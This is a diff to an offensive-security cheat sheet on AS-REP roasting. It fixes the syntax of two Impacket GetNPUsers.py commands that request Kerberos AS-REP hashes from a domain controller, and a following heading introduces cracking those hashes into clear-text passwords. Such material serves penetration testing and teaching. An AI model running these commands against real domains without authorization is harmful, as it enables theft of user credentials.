@@ -11,12 +11,12 @@ A bunch of usernames will be returned but no passwords. If Kerberos pre-authenti
 ---
 ## Obtain Encrypted User Password
 ```
-▶ GetNPUsers.py {TARGET_DOMAIN} -usersfile domain_users.txt -outputfile users_password_hashes.txt -dc-ip {TARGET_DOMAIN_CONTROLLER_IP}
+▶ GetNPUsers.py {TARGET_DOMAIN}/ -usersfile domain_users.txt -outputfile users_password_hashes.txt -dc-ip {TARGET_DOMAIN_CONTROLLER_IP}
 ```
 
 It is assumed the Impacket script `GetNPUsers.py` requires a username as a parameter and therefore the script is usually ran on all the usernames that were found. However, it turns out that the script can be used to output both the vulnerable usernames and their corresponding encrypted TGTs.
 ```
-▶ GetNPUsers.py {TARGET_DOMAIN} -outputfile users_password_hashes.txt -dc-ip {TARGET_DOMAIN_CONTROLLER_IP} -request
+▶ GetNPUsers.py {TARGET_DOMAIN}/ -outputfile users_password_hashes.txt -dc-ip {TARGET_DOMAIN_CONTROLLER_IP} -request
 ```
 
 ### Crack Hash to Obtain Clear Text Password
